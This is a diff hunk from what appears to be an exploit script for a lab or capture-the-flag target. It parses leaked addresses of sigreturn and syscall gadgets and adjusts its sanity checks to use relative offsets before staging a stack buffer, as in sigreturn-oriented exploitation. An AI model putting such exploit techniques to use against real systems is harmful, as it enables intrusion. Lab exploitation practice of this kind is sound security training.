@@ -71,7 +71,11 @@ def main():
     m = re.search(r"probe\(\) at (0x[0-9a-f]+)", text)
     probe = int(m.group(1), 16)
     print(f"[+] leak: sigreturn={sigret:#x} syscall={syscall:#x} probe={probe:#x}")
-    assert sigret & 0xFFF == 0x229, "sigreturn gadget base-relative offset mismatch"
+    # toolchain-independent checks: the deltas are compile-stable, the
+    # absolute offsets shift with the lab container's gcc (the ORACLE
+    # caveat): syscall sits right after sigreturn, probe follows.
+    assert syscall - sigret == 0xA, "syscall gadget not right after sigreturn"
+    assert probe - sigret == 0xD, "probe gadget not where expected"
 
     # 2. stack: the staging buffer's address (the writable segment)
     s.send(b"s\n")
